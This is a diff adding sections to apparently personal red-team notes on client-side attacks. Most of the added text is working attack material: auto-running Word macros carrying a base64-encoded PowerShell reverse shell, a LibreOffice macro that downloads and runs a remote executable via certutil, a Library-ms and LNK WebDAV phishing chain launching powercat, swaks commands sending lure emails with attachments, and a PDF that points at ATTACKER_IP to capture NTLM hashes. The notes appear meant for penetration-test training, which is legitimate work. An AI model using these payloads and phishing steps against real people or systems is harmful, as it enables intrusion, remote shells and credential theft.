@@ -1,12 +1,41 @@
 ---
 title: Client-Side Attacks
-draft: false
+draft: true
 tags:
   - red-team
   - offensive
   - phishing
 ---
  
+# Information Gathering
+
+#### Enumerate metadata and tags from files
+
+- Enumerate PDFs:
+```
+site:DOMAIN filetype:pdf
+```
+
+> [!Note]
+> PDFs can also be downloaded from the official website.
+
+- Once downloaded, we can extract the metadata:
+```bash
+$ exiftool -a -u FILENAME.pdf
+
+Parameters:
+-a: display duplicate tags
+-u: display unknown tags
+```
+
+> [!Note]
+> Look for names, creator tools, creation date...
+
+#### Enumerate victim OS and Browser
+
+We'll use [_Canarytokens_](https://canarytokens.com/), a free web service that generates a link with an embedded token that we'll send to the target. When the target opens the link in a browser, we will get information about their browser, IP address, and operating system.
+
+---
 # Create a fingerprinting web site
 
 - Setup web server (in this case Apache web server):
@@ -63,7 +92,9 @@ Word and Excel allows users to embed VBA macros (programs) in documents/spreadsh
 
 Wscript: Windows Script Host object model that provides a scripting environment for executing scripts on Windows-based OS. It can be utilized to extend the capabilities of VBA macros by enabling them to interact with the Windows OS, execute external commands, manipulate files and folders. Its like calling a library or class.
 
-Extension: .docm. .dot and dotm (document that allows macros. docx dont allow them)
+> [!Note]
+> Valid extensions: `.docm`, `.dot` and `.dotm`.
+> Invalid extensions: `.docx`.
 
 - Hello World:
 ```vb
@@ -108,6 +139,9 @@ Sub PoC()
     wsh.Run "notepad.exe", 2, False ' Create a Wscript object to Invoke shell and execute the payload, windowstyle
 End Sub
 ```
+
+> [!Note]
+> Both procedures (`Document_Open` and `AutoOpen`) differ slightly, depending on how Microsoft Word and the document were opened. Both cover special cases which the other one doesn't and therefore we use both.
 
 - Read the registry:
 ```vb
@@ -268,6 +302,66 @@ Sub powercat()
 ```
 
 Here the only difference is that the reverse shell is encoded with powershell encode so powershell knows how to decode it (this will be done in memory) and executed
+
+## Encoded Reverse shell (payload)
+This option is recommended to guarantee that the command will be executed correctly and wont fail due to a special character.
+
+1. Encode the payload:
+```
+$ echo "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell" | base64
+
+SUVYKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRw
+Oi8vMTkyLjE2OC4xMTkuMi9wb3dlcmNhdC5wczEnKTtwb3dlcmNhdCAtYyAxOTIuMTY4LjExOS4y
+IC1wIDQ0NDQgLWUgcG93ZXJzaGVsbAo=
+```
+
+2. Split the base64 encoded string into pieces of 50 characters:
+```python
+str = "powershell.exe -nop -w hidden -enc SUVYKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTkyLjE2OC40OS42Mi9wb3dlcmNhdC5wczEnKTtwb3dlcmNhdCAtYyAxOTIuMTY4LjQ5LjYyIC1wIDQ0NDQgLWUgcG93ZXJzaGVsbAo="
+
+n = 50
+
+for i in range(0, len(str), n):
+	print("Str = Str + " + '"' + str[i:i+n] + '"')
+```
+
+> [!Note]
+> Make sure that in the base64 string payload we dont introduce any new lines.
+
+3. Execute the script:
+```
+$ vim script.py
+$ chmod +x script.py 
+$ python3 script.py 
+Str = Str + "powershell.exe -nop -w hidden -enc SUVYKE5ldy1PYmp"
+Str = Str + "lY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3Rya"
+Str = Str + "W5nKCdodHRwOi8vMTkyLjE2OC4xMTkuMi9wb3dlcmNhdC5wczE"
+Str = Str + "nKTtwb3dlcmNhdCAtYyAxOTIuMTY4LjExOS4yIC1wIDQ0NDQgL"
+Str = Str + "WUgcG93ZXJzaGVsbAo="
+```
+
+4. Create the macro:
+```vba
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+    Dim Str As String
+    
+    Str = Str + "powershell.exe -nop -w hidden -enc SUVYKE5ldy1PYmp"
+	Str = Str + "lY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3Rya"
+	Str = Str + "W5nKCdodHRwOi8vMTkyLjE2OC4xMTkuMi9wb3dlcmNhdC5wczE"
+	Str = Str + "nKTtwb3dlcmNhdCAtYyAxOTIuMTY4LjExOS4yIC1wIDQ0NDQgL"
+	Str = Str + "WUgcG93ZXJzaGVsbAo="
+
+    CreateObject("Wscript.Shell").Run Str
+End Sub
+```
 
 ## Using activeX controls for Macro Execution
 ActiveX: technologies developed my Microsoft for creating interactive content within web pages and desktop applications.
@@ -431,6 +525,24 @@ PSH> python -m http.server HTTP_LOCAL_PORT
 
 *Go to the target machine and download and run the document*
 ```
+
+## Macro reverse shell
+
+1. Open libreoffice:
+```bash
+$ libreoffice
+```
+
+2. Create the macro: Go to Tools -> Macros -> Organize Macros -> Basic -> New (create a new one over the document we are using)
+```vb
+Sub Main
+	Shell("cmd /c certutil -urlcache -split -f http://192.168.45.215/shell.exe C:\Windows\Temp\shell.exe")
+	Shell("cmd /c C:\Windows\Temp\shell.exe")
+End Sub
+```
+
+3. Insert the macro in the document: Go to Tools -> Customize -> Events -> Open Document and select the
+
 
 ## File smuggling with HTML and JavaScript
 Delivery: attacker delivers the payload or malicious document to the target. 
@@ -598,3 +710,184 @@ $ python3 -m http.server 8080
 ```
 
 On beef interface, go to commands section and select the fake notification bar. Set the plugin URL to the payload that we are hosting, and set the message.
+
+## Windows Library Files (Phishing)
+
+Library files consist of three major parts and are written in XML to specify the parameters for accessing remote locations. The parts are _General library information_, _Library properties_, and _Library locations_.
+
+1. Create the Windows Library File (from a Windows host):
+
+Open VS Code and just save a blank file called `config.Library-ms` on the Desktop.
+
+> [!Note]
+> Library files have the extension `.Library-ms`, for example `config.Library-ms`
+
+2. Open the previous file again and add the following code:
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+<name>@windows.storage.dll,-34582</name>
+<version>6</version>
+<isLibraryPinned>true</isLibraryPinned>
+<iconReference>imageres.dll,-1003</iconReference>
+<templateInfo>
+<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+</templateInfo>
+<searchConnectorDescriptionList>
+<searchConnectorDescription>
+<isDefaultSaveLocation>true</isDefaultSaveLocation>
+<isSupported>false</isSupported>
+<simpleLocation>
+<url>http://LOCAL_HOST</url>
+</simpleLocation>
+</searchConnectorDescription>
+</searchConnectorDescriptionList>
+</libraryDescription>
+```
+
+> [!Note]
+> Change the `url` tag to the WebDAV server host.
+
+3. Create a `.LNK` called `automatic_configuration.lnk` with the following contents to execute the reverse shell:
+```powershell
+powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://LOCAL_HOST:LOCAL_PORT/powercat.ps1'); powercat -c LOCAL_HOST -p LISTENER_PORT -e powershell"
+```
+
+4. Copy the `.LNK` and the `.Library-ms` to the WebDAV server:
+```bash
+$ smbclient //LOCAL_HOST/share -c 'put config.Library-ms'
+```
+
+> [!Note]
+> This step involves uploading the files to the kali attack machine where the webdav server is going to be hosted. We can use SMB shares better.
+
+5. Start the listeners and http server:
+```bash
+$ python3 -m http.server LOCAL_PORT
+$ nc -nvlp LISTENER_PORT
+```
+
+6. Setup a WebDAV server on our attack host:
+
+> [!Important]
+> Dont setup the server and wait until the `config.Library-ms` and the `.LNK` are in the webdav folder to avoid changing the config metadata.
+
+```bash
+$ pip3 install wsgidav # install the webdav server packages
+or
+$ sudo apt install python3-wsgidav
+
+
+$ mkdir /home/kali/webdav # create the directory where we are going to host the .lnk to the payload
+
+$ touch /home/kali/webdav/test.txt # create a placeholder
+
+$ /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/ # initiate the WebDAV server
+
+Parameters:
+--host=<IP>: host where we are serving the webdav
+--port=<PORT>: port where we are serving the webdav
+--auth=<TYPE>: auth type
+--root=<DIR>: root dir of the webdav share
+```
+
+7. Send a phishing email to the target with the `config.Library-ms`:
+```bash
+$ sudo swaks [ -t DESTINATION_EMAIL -t DESTINATION_EMAIL ...] --from SOURCE_EMAIL -ap --attach @config.Library-ms --server <victim-ip> --body @body.txt --header "Subject: Urgent Configuration Setup" --suppress-data
+
+Example:
+sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
+
+or
+
+$ sudo swaks -t mailadmin@localhost --from jonas@localhost --attach @file.ods --server 192.168.138.140 --body "Please check this spreadsheet" --header "Subject: Please check this spreadsheet"
+```
+
+> [!Note]
+> Put `@` before the attachments to attach the files. If not, a string will be send.
+
+# Create ODT/ODS format payloads (automated)
+
+Clone the following repo:
+```bash
+git clone https://github.com/0bfxgh0st/MMG-LO/
+```
+
+Usage:
+```bash
+python3 mmg-ods.py [windows|linux] LOCAL_IP LOCAL_PORT
+
+[windows|linux] = target OS
+```
+
+Setup a listener:
+```bash
+nc -nvlp LOCAL_PORT
+```
+
+Send email:
+```bash
+sudo swaks [ -t DESTINATION_EMAIL -t DESTINATION_EMAIL ...] --from SOURCE_EMAIL -ap --attach @config.Library-ms --server <victim-ip> --body @body.txt --header "Subject: Urgent Configuration Setup" --suppress-data
+```
+
+# File Upload Phishing
+
+If we identify in a web server a file upload functionality that we know a user behind will open the uploaded file (for example a CV for a job application), we can setup a responder and upload a file referencing our IP to extract the user hash.
+
+1. Setup responder:
+```
+$ sudo responder -I INTERFACE
+```
+
+2. Craft the malicious phishing payload:
+
+**PDF**
+```
+%PDF-1.4
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R >>
+endobj
+
+2 0 obj
+<< /Type /Pages /Kids [3 0 R] /Count 1 >>
+endobj
+
+3 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /XObject << /Im0 5 0 R >> >> >>
+endobj
+
+4 0 obj
+<< /Length 44 >>
+stream
+q
+100 0 0 100 100 600 cm
+/Im0 Do
+Q
+endstream
+endobj
+
+5 0 obj
+<<
+/Type /XObject
+/Subtype /Image
+/Width 1
+/Height 1
+/ColorSpace /DeviceRGB
+/BitsPerComponent 8
+/Filter /DCTDecode
+/Length 0
+/F (\\\\ATTACKER_IP\\share\\test.jpg)
+>>
+stream
+endstream
+endobj
+
+xref
+0 6
+0000000000 65535 f
+trailer
+<< /Size 6 /Root 1 0 R >>
+startxref
+%%EOF
+
+```
